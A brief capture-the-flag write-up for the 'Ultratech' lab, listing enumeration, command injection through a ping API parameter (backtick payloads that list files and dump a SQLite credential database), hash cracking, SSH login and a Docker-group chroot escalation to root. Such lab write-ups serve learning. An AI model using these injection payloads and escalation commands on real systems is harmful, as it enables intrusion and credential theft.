# CTF Writeup: Ultratech

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 21,22,8081 and 31331 open
- Step 2: analyzed webpage on :8081 and retrieved version of UltraTech API v0.1.3
- Step 3: analyzed webpage on :31331 --> couldn't retrieve anything
- Step 4: enumerated :8081 and found /auth & /ping --> ping seems to have some sort of LFI or RFI
- Step 5: found /partners.html from robots.txt on port 31331. Analyzed api.js --> found parameter ping?ip=$
- Step 7: changed url to ping?ip=$`ls` --> retrieved database "utech.db.sqlite"
- Step 8: changed input to http://ultratech.thm:8081/ping?ip=$`cat%20utech.db.sqlite`and retrieved
creds: r00t:f357a0c52799563c7c7b76c1e7543a32 admin:0d0ea5111e3c1def594c1684e3b9be84
- Step 9: used crackstation to crack first hash password --> n100906 --> 2nd password mrsheafy.
- Step 10: logged into r00t via ssh
- Step 11: made id --> docker
- Step 12: made docker run -v /:/mnt --rm -it bash chroot /mnt sh --> gained root rce
- Step 13: retrieved first 9 characters of root users private ssh key

---

## Key Learnings

- Immensely strengthened enumeration skill methodology
- Strengthened Docker priv esc knowledge
-

